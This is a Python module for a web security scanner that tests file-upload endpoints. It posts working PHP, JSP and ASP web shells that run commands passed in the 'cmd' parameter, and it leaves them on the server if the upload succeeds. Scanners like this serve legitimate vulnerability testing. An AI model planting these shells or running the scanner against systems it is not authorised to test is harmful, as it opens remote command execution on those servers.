"""
File Upload Vulnerability Scanner
"""
import asyncio
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity
from ..http.client import Response


class FileUploadScanner(BaseScanner):
    """File upload vulnerability scanner"""
    
    MALICIOUS_FILES = {
        "php_shell": {
            "content": "<?php system($_GET['cmd']); ?>",
            "extensions": ["php", "php3", "php4", "php5", "phtml"],
        },
        "jsp_shell": {
            "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "extensions": ["jsp", "jspx"],
        },
        "asp_shell": {
            "content": "<% eval request(\"cmd\") %>",
            "extensions": ["asp", "aspx"],
        },
    }
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "POST", **kwargs) -> List[Vulnerability]:
        """Scan for file upload vulnerabilities"""
        vulnerabilities = []
        
        # File upload is typically POST
        if method.upper() != "POST":
            return vulnerabilities
        
        # Look for file upload endpoints
        upload_keywords = ["upload", "file", "image", "attachment"]
        if not any(keyword in url.lower() for keyword in upload_keywords):
            return vulnerabilities
        
        # Test with malicious files
        for file_type, file_info in self.MALICIOUS_FILES.items():
            for ext in file_info["extensions"]:
                try:
                    # Create multipart form data
                    files = {
                        "file": (f"test.{ext}", file_info["content"], f"text/{ext}")
                    }
                    
                    resp = await self.http_client.post(url, files=files, timeout=10)
                    
                    # Check if file was uploaded
                    if resp.status_code in [200, 201]:
                        # Check if file is accessible
                        uploaded_url = self._extract_uploaded_file_url(resp, url)
                        if uploaded_url:
                            access_resp = await self.http_client.get(uploaded_url, timeout=5)
                            if access_resp.status_code == 200:
                                return self._create_vulnerability(
                                    name="Unrestricted File Upload",
                                    severity=Severity.HIGH,
                                    url=url,
                                    description=f"Malicious {ext} file uploaded and accessible",
                                    evidence=f"File accessible at {uploaded_url}",
                                    recommendation="Validate file types and extensions. Store uploaded files outside web root.",
                                    cwe="CWE-434"
                                )
                except:
                    continue
        
        return vulnerabilities
    
    def _extract_uploaded_file_url(self, response: Response, base_url: str) -> Optional[str]:
        """Extract uploaded file URL from response"""
        import re
        from urllib.parse import urljoin
        
        # Look for file URL in response
        url_patterns = [
            r'["\']([^"\']*upload[^"\']*\.(php|jsp|asp))["\']',
            r'href=["\']([^"\']*upload[^"\']*)["\']',
            r'src=["\']([^"\']*upload[^"\']*)["\']',
        ]
        
        for pattern in url_patterns:
            matches = re.finditer(pattern, response.text, re.IGNORECASE)
            for match in matches:
                file_url = match.group(1)
                return urljoin(base_url, file_url)
        
        return None

